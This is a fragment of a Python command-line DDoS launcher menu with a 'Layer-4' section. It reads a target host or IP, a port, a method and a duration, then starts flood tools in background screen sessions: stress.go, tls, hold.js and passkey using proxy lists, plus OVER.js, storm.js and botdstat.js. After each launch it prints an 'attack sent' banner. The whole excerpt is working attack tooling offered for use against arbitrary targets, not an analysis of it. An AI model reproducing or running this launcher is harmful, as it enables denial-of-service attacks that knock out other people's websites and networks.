...
#########LAYER-4########
			...
			try:
				...
				method = sin.split()[3]
				time = sin.split()[4]
				os.system(f'cd .resources && screen -dm go run stress.go {ip} {port} {method} 1250 {time} 5')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
...
\033[35m           ╚════════════════════════════════════════════════════════╝
\033[35mPLEASE AFTER ATTACK DONE TYPE "CLS", FOR REFRESH YOUR TERMINAL
""")
			except ValueError:
				main()
			except IndexError:
...
""")
			...
			try:
				...
				os.system(f'cd /media && screen -dm ./tls {host} {time} 32 5 500')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
...
""")
			...
			try:
				...
				os.system(f'cd .BRUTE && screen -dm node hold.js {host} {time} 64 10 proxy.txt')
				os.system(f'cd /media && screen -dm ./passkey {host} {time} 100 GET proxy.txt 32')
				os.system ("clear")
				print(f"""
\033[35m                         ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═ \033[1;37m╔═╗╔═╗╔╗╔╔╦╗
\033[35m                         ╠═╣ ║  ║ ╠═╣║  ╠╩╗\033[1;37m ╚═╗║╣ ║║║ ║
...
""")
			...
			try:
				...
				os.system(f'cd .SUDAN && screen -dm node OVER.js {host} 64 {time}')
				os.system(f'cd .randomstring && screen -dm python3 input.py {host} {time}')
				os.system(f'cd .resources && screen -dm node botdstat.js {host} 10 {time}')
				os.system(f'cd .resources && screen -dm node storm.js {host} 10 {time}')
				os.system(f'cd /media && screen -dm node storm.js {host} 10 {time}')
				os.system(f'cd /media && screen -dm node botdstat.js {host} 10 {time}')
